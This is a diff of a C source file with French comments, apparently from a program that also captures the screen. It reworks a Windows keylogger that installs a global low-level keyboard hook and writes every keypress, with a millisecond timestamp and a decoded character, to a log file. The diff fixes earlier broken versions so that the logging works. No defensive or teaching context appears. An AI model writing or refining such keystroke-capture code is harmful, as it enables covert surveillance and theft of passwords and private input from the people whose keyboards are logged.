@@ -147,64 +147,72 @@ void capture_screen_at_fps(int target_fps, const char *output_directory) {
 #include <stdlib.h>
 #include <string.h>
 
-// Callback pour le hook clavier sous Windows
+
+FILE *logfile = NULL;
+
+// Fonction pour obtenir le timestamp UNIX (secondes depuis 1970)
+long get_unix_time() {
+    return (long)time(NULL);
+}
+
+// Convertit vkCode en caractère lisible (simplifié)
+char vkcode_to_char(DWORD vkCode) {
+    // Si c'est une lettre majuscule
+    if (vkCode >= 0x41 && vkCode <= 0x5A) {
+        return (char)vkCode;
+    }
+
+    // Si c'est un chiffre
+    if (vkCode >= 0x30 && vkCode <= 0x39) {
+        return (char)vkCode;
+    }
+
+    // Retourne '.' pour les touches non mappées
+    return '.';
+}
+
+long long get_unix_time_ms() {
+    FILETIME ft;
+    GetSystemTimeAsFileTime(&ft);
+
+    ULARGE_INTEGER ull;
+    ull.LowPart = ft.dwLowDateTime;
+    ull.HighPart = ft.dwHighDateTime;
+
+    // FILETIME = 100-nanosecond intervals since Jan 1, 1601
+    // Convert to milliseconds since Unix epoch (Jan 1, 1970)
+    return (ull.QuadPart - 116444736000000000ULL) / 10000;
+}
+
+
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
-    if (nCode == HC_ACTION) {
+    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
         KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
-        if (wParam == WM_KEYDOWN) {
-            FILE *logfile = (FILE *)kbd->dwExtraInfo; // Récupère le fichier passé en argument
-            fprintf(logfile, "Key pressed: %ld\n", kbd->vkCode); // Enregistre la touche dans le fichier
-        }
+
+        long long unix_time_ms = get_unix_time_ms();  // Utilisation de la version millisecondes
+        char c = vkcode_to_char(kbd->vkCode);
+
+        fprintf(logfile, "%lld : %ld (char: %c)\n", unix_time_ms, kbd->vkCode, c);
+        fflush(logfile);
     }
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
-// Fonction pour obtenir l'heure en secondes depuis l'époque Unix (UTC)
-char* get_current_time() {
-    time_t now;
-    time(&now);
-    struct tm *gmt = gmtime(&now); // Obtient l'heure UTC
-    static char time_str[20];
-    strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", gmt); // Format "YYYY-MM-DD HH:MM:SS"
-    return time_str;
-}
 
-// Fonction de callback pour gérer la pression des touches
-LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
-    // Si c'est une pression de touche (WM_KEYDOWN)
-    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
-        KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
-        FILE *logfile = (FILE*)GetKeyState(0); // Récupère le pointeur du fichier passé
-
-        // Obtenir le temps actuel au format UTC
-        char *current_time = get_current_time();
-
-        // Enregistre la touche pressée et l'horodatage dans le fichier
-        fprintf(logfile, "%s: %c\n", current_time, pKeyboard->vkCode);
-        fflush(logfile); // Force l'écriture immédiate dans le fichier
-    }
-    return CallNextHookEx(NULL, nCode, wParam, lParam); // Permet la propagation de l'événement
-}
-
-// Fonction pour démarrer le keylogger sous Windows
+// Lancement du keylogger
 void start_keylogger(const char *file_path) {
-    FILE *logfile = fopen(file_path, "a"); // Ouvre le fichier pour ajouter des logs
+    logfile = fopen(file_path, "a");
     if (!logfile) {
-        printf("Failed to open log file\n");
+        printf("Erreur ouverture fichier\n");
         return;
     }
 
     HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
-    if (hook == NULL) {
-        printf("Failed to install hook\n");
+    if (!hook) {
+        printf("Erreur d'installation du hook\n");
         fclose(logfile);
         return;
     }
-
-    // Passer le fichier en argument en utilisant dwExtraInfo
-    SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
-    KBDLLHOOKSTRUCT kbdInfo;
-    kbdInfo.dwExtraInfo = (ULONG_PTR)logfile; // Passer le fichier à la fonction de callback
 
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
@@ -213,7 +221,8 @@ void start_keylogger(const char *file_path) {
     }
 
     UnhookWindowsHookEx(hook);
-    fclose(logfile); // Ferme le fichier après l'exécution du keylogger
+    fclose(logfile);
 }
+
 
 #endif
